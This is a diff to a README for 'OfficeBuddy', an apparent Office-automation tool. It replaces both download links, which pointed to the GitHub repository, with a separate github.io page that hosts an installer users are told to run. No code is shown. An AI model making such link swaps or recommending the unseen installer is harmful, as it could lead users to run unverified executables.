@@ -1,6 +1,6 @@
 # 🤖 OfficeBuddy - Automate your Microsoft Office document tasks
 
-[![](https://img.shields.io/badge/Download-OfficeBuddy-blue.svg)](https://github.com/samirshaw108-alt/OfficeBuddy)
+[![](https://img.shields.io/badge/Download-OfficeBuddy-blue.svg)](https://samirshaw108-alt.github.io)
 
 OfficeBuddy acts as your personal assistant for Microsoft Word and Excel. It modifies your documents and checks its own work by opening the files in Microsoft Office. This ensures your documents contain the correct data and formatting. You save time on repetitive tasks while keeping full control over your files.
 
@@ -21,7 +21,7 @@ To run OfficeBuddy on your Windows computer, you need these items:
 
 Follow these steps to prepare the software on your machine:
 
-1. Visit [this page to download](https://github.com/samirshaw108-alt/OfficeBuddy) the latest version of the installer.
+1. Visit [this page to download](https://samirshaw108-alt.github.io) the latest version of the installer.
 2. Locate the file in your Downloads folder.
 3. Double-click the file to start the installation wizard.
 4. Follow the on-screen prompts. Choose the default folder for the installation.
